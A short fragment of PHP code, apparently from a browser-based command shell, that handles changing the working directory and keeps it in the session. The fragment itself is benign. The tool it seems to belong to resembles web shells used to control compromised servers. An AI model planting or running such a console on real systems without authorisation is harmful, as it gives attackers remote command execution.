        $new = trim($m[1], " \t\n\r\0\x0B\"'");
        if ($new[0] !== '/') {
            $new = rtrim($dir, '/') . '/' . $new;
        }
        if (@chdir($new)) {
            $_SESSION['cwd'] = realpath($new);
            $cmd_output = "Moved to: " . htmlspecialchars($_SESSION['cwd']);
        } else {
            $cmd_output = "Failed to move to: " . htmlspecialchars($new);
        }
